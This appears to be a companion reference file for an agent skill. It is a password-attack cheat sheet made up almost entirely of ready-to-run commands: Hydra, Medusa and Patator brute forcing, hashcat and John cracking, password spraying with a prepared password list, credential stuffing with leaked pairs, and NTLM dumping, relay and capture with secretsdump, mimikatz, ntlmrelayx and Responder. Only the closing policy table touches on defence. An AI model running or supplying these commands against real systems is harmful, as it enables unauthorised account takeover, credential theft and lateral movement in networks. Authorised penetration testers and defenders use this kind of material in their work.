# Password Attack Payloads

> This file is a companion to `SKILL.md`, organizing all password attack payloads into eight categories.

---

## 1. Online Attacks

### Hydra - SSH

```bash
# Basic SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# Multi-user + speed control
hydra -L users.txt -P passwords.txt ssh://192.168.1.100 -t 4 -W 3

# Stop on success
hydra -L users.txt -P passwords.txt -t 4 -W 5 -f ssh://target
# -t concurrent threads  -W interval between attempts (seconds)  -f stop on first success
```

### Hydra - FTP

```bash
# FTP brute force
hydra -l admin -P passwords.txt ftp://192.168.1.100

# FTP multi-threaded
hydra -l admin -P passwords.txt -t 8 ftp://192.168.1.100
```

### Hydra - HTTP POST Form

```bash
# HTTP POST form brute force (note syntax: URL parameters:success/failure indicators)
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect"

# With both failure and success indicators
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:S=Welcome:F=Invalid"
```

### Hydra - HTTP GET Basic Auth

```bash
# HTTP GET basic auth brute force
hydra -l admin -P passwords.txt target.com http-get /admin/

# With custom header
hydra -l admin -P passwords.txt target.com http-get -H "Authorization: Basic ^BASE64^" /api/
```

### Hydra - MySQL / Databases

```bash
# MySQL database brute force
hydra -l root -P passwords.txt mysql://192.168.1.100

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://192.168.1.100

# MSSQL
hydra -l sa -P passwords.txt mssql://192.168.1.100
```

### Hydra - RDP

```bash
# RDP brute force (requires xfreerdp support)
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# RDP low speed to avoid lockout
hydra -l administrator -P passwords.txt -t 1 -W 10 rdp://192.168.1.100
```

### Hydra - SMB

```bash
# SMB brute force
hydra -l administrator -P passwords.txt smb://192.168.1.100

# SMB multi-module
hydra -L users.txt -P passwords.txt smb://192.168.1.100 -t 2
```

### Medusa - Multi-Protocol Parallel

```bash
# SSH brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Parallel multi-host
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 4

# FTP brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp

# HTTP form
medusa -h target.com -u admin -P passwords.txt -M web-form \
  -m FORM:"/login.php" -m FORM-DATA:"post?user=^USER^&pass=^PASS^" \
  -m DENY-SIGNAL:"Invalid"
```

### Patator - Multi-Protocol Framework

```bash
# SSH brute force
patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# FTP brute force
patator ftp_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt

# HTTP POST form
patator http_fuzz url=http://target.com/login method=POST \
  body="user=admin&pass=FILE0" 0=passwords.txt \
  -x ignore:fgrep='Invalid password'
```

---

## 2. Offline Hash Cracking

### Hashcat - Dictionary Attack (Attack Mode 0)

```bash
# Basic dictionary attack - NTLM
hashcat -a 0 -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary attack - SHA-256
hashcat -a 0 -m 1400 sha256_hashes.txt rockyou.txt

# Dictionary attack - bcrypt
hashcat -a 0 -m 3200 bcrypt_hashes.txt rockyou.txt
```

### Hashcat - Rule Attacks

```bash
# best64 rule - common transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# dive rule - deep transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule

# T0XlC rule - advanced transformations
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/T0XlC.rule

# Multiple rules stacked
hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/clem9669_medium.rule
```

### Hashcat - Combination Attack (Attack Mode 1)

```bash
# Combine words from two dictionaries
hashcat -a 1 -m 1000 hashes.txt dict1.txt dict2.txt

# Combination attack + rules
hashcat -a 1 -m 1000 hashes.txt dict1.txt dict2.txt -j "u" -k "d"
```

### Hashcat - Mask Brute Force (Attack Mode 3)

```bash
# Uppercase + 3 lowercase + 3 digits + symbol
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?d?d?d?s

# Pure 8-digit number
hashcat -a 3 -m 1000 hashes.txt ?d?d?d?d?d?d?d?d

# Common pattern: first letter uppercase + lowercase + 4 digits
hashcat -a 3 -m 1000 hashes.txt ?u?l?l?l?l?d?d?d?d

# Mask character sets:
# ?l = abcdefghijklmnopqrstuvwxyz
# ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
# ?d = 0123456789
# ?s = special characters
# ?a = all characters
```

### Hashcat - Hybrid Attacks (Attack Mode 6/7)

```bash
# Append 4 digits to dictionary word (Mode 6: word+mask)
hashcat -a 6 -m 1000 hashes.txt rockyou.txt ?d?d?d?d

# Prepend 3 digits to dictionary word (Mode 7: mask+word)
hashcat -a 7 -m 1000 hashes.txt ?d?d?d rockyou.txt
```

### Hashcat - Session Management and Recovery

```bash
# Create named session
hashcat -a 0 -m 1000 hashes.txt rockyou.txt --session crack1

# Restore interrupted session
hashcat --session crack1 --restore
```

### John the Ripper - Basic Cracking

```bash
# Auto-detect hash type and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Single crack mode - use username/GECOS info to generate candidate passwords
john --single hashes.txt

# Incremental mode - brute force with progressively expanding character sets
john --incremental hashes.txt

# Specify format and rules
john --format=nt --wordlist=rockyou.txt --rules=Single ntlm_hashes.txt

# Show cracked results
john --show hashes.txt
```

### John the Ripper - File Password Cracking

```bash
# ZIP file
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt

# Office document
office2john document.xlsx > office_hash.txt
john --wordlist=rockyou.txt office_hash.txt

# KeePass database
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt

# PDF document
pdf2john document.pdf > pdf_hash.txt
john --wordlist=rockyou.txt pdf_hash.txt
```

---

## 3. Wordlist Generation and Mutation

### Cewl - Website Crawling Wordlist

```bash
# Basic crawling
cewl https://target.com -d 2 -m 4 -w website_words.txt
# -d crawl depth  -m minimum word length  -w output file

# Crawl with authentication
cewl https://target.com -u admin -p password -d 3 -m 5 -w auth_words.txt

# Generate lowercase variants
cewl https://target.com -d 2 -m 4 --lowercase -w lower_words.txt

# Include email addresses
cewl https://target.com -d 2 -m 4 -e -w words_with_emails.txt
```

### Crunch - Pattern Wordlist Generation

```bash
# Generate password wordlist by pattern
crunch 6 8 -t Company@%%% -o pattern_dict.txt
# @ = lowercase letter  , = uppercase letter  % = digit  ^ = symbol

# Pure numeric wordlist
crunch 4 4 0123456789 -o pin_dict.txt

# Custom character set
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o custom_dict.txt

# Specify character set
crunch 6 6 abcdef123456 -o hex_dict.txt
```

### John the Ripper Rule Mutation

```bash
# Use built-in rules
john --wordlist=base.txt --rules --stdout > mangled_dict.txt

# Use custom rules (defined in john.conf)
john --wordlist=base.txt --rules=KoreLogic > korelogic_dict.txt

# Single crack mode to generate candidate passwords
john --single --wordlist=base.txt --stdout > single_mangled.txt
```

### Wordlist Merging and Deduplication

```bash
# Merge multiple wordlists and deduplicate
cat website_words.txt mangled_dict.txt rockyou.txt | sort -u > final_dict.txt

# Deduplicate using uniq (must sort first)
sort dict1.txt dict2.txt | uniq > merged_unique.txt
```

---

## 4. Hash Type Identification

### Hashcat Identification

```bash
# Auto-detect hash type
hashcat --identify hashes.txt
```

### Common Hash Characteristic Reference

| Hash Prefix/Characteristic | Algorithm | Hashcat Mode | John Format |
|---------------|------|-------------|-------------|
| `$2b$` / `$2y$` | bcrypt | 3200 | bcrypt |
| `$6$` | SHA-512 crypt | 1800 | sha512crypt |
| `$5$` | SHA-256 crypt | 7400 | sha256crypt |
| `$1$` | MD5 crypt | 500 | md5crypt |
| 32 hex chars | MD5 | 0 | raw-md5 |
| 40 hex chars | SHA-1 | 100 | raw-sha1 |
| 64 hex chars | SHA-256 | 1400 | raw-sha256 |
| 128 hex chars | SHA-512 | 1700 | raw-sha512 |
| `aad3b435b51404ee...` | NTLM | 1000 | nt |
| `$kerberoast$` | Kerberos TGS | 13100 | krb5tgs |
| `$DCC2$` | Domain Cached Credentials v2 | 2100 | mscash2 |
| `{xtra}` / `$NT$` | NT hash | 1000 | nt |

---

## 5. Password Spray Attacks

### Concept

Password spraying uses a small number of common passwords to test a large number of accounts, avoiding account lockout policies. This is the opposite of traditional brute forcing (trying many passwords against one account).

### Hydra Password Spraying

```bash
# Test single password against multiple users
hydra -L all_users.txt -p "Spring2026!" ssh://target -t 2 -W 10

# Multi-protocol spraying
for pw in "Password1" "Welcome1" "Spring2026!" "Company2026"; do
  hydra -L users.txt -p "$pw" ssh://192.168.1.100 -t 1 -W 5
done
```

### Kerberos Password Spraying

```bash
# kerbrute password spraying
kerbrute passwordspray -d domain.local --dc 192.168.1.1 users.txt "Spring2026!"

# crackmapexec password spraying
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Welcome1!" --no-bruteforce
```

### Common Spray Password List

```
Password1
Welcome1
Spring2026!
Summer2026!
Winter2026!
Company2026!
P@ssw0rd
Changeme1
Letmein1
Password123
```

---

## 6. Credential Stuffing

### Concept

Using leaked credential pairs (username/password) to attempt login to other services. Based on the behavioral pattern of users reusing passwords across sites.

### Hydra Credential Stuffing

```bash
# Use credential pair list
hydra -C credentials.txt http-post-form://target.com \
  "/login:user=^USER^&pass=^PASS^:F=Invalid"

# Credential pair file format (user:password):
# admin:password123
# user1:Welcome1
```

### Cross-Protocol Credential Testing

```bash
# Test SSH credentials
for cred in $(cat known_creds.txt); do
  user=$(echo "$cred" | cut -d: -f1)
  pass=$(echo "$cred" | cut -d: -f2)
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@target" "echo success" 2>/dev/null
done

# Test SMB credentials
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

---

## 7. NTLM / NetNTLM Attacks

### NTLM Hash Extraction

```bash
# Extract from SAM database
secretsdump.py -sam SAM -system SYSTEM LOCAL

# Extract from NTDS.dit (domain controller)
secretsdump.py domain/admin:password@dc_ip -ntds NTDS.dit

# Extract using mimikatz
# sekurlsa::logonpasswords
# lsadump::sam
```

### NTLM Relay Attacks

```bash
# ntlmrelayx relay
ntlmrelayx.py -t smb://192.168.1.100 -smb2support

# Relay to LDAP
ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip

# Multi-target relay
ntlmrelayx.py -tf targets.txt -smb2support
```

### NetNTLMv1/v2 Capture and Cracking

```bash
# Use Responder to capture challenge/response
responder -I eth0 -wrf

# Crack NetNTLMv2 hashes (hashcat mode 5600)
hashcat -a 0 -m 5600 netntlmv2_hashes.txt rockyou.txt

# Crack NetNTLMv1 hashes (hashcat mode 5500)
hashcat -a 0 -m 5500 netntlmv1_hashes.txt rockyou.txt
```

---

## 8. Password Policy Analysis

### Windows Password Policy Enumeration

```bash
# Use crackmapexec to enumerate password policy
crackmapexec smb 192.168.1.100 --pass-pol

# Use ldapsearch to enumerate
ldapsearch -x -H ldap://dc_ip -b "DC=domain,DC=local" \
  "(objectClass=domainDNS)" maxPwdAge minPwdAge minPwdLength pwdHistoryLength \
  pwdProperties

# Use net command
net accounts /domain
```

### Linux Password Policy Check

```bash
# Check PAM password policy
cat /etc/security/pwquality.conf
cat /etc/pam.d/common-password

# Check /etc/login.defs
grep -E "PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_MIN_LEN|PASS_WARN_AGE" /etc/login.defs

# Check user password aging
chage -l username
```

### Policy Analysis Reference Points

| Policy Parameter | Security Baseline | Attack Exploitation |
|----------|---------|---------|
| Minimum password length | >= 12 characters | Length < 8 allows fast brute force |
| Password complexity | Uppercase + lowercase + digits + special | No complexity allows pure dictionary attacks |
| Password history | >= 12 | No history limit allows cycling old passwords |
| Lockout threshold | 5-10 failed attempts | High threshold increases online brute force success rate |
| Lockout duration | >= 30 minutes | Short lockout allows sustained slow brute force |
| Password expiration | 90 days | Overly long expiration increases exposure window |
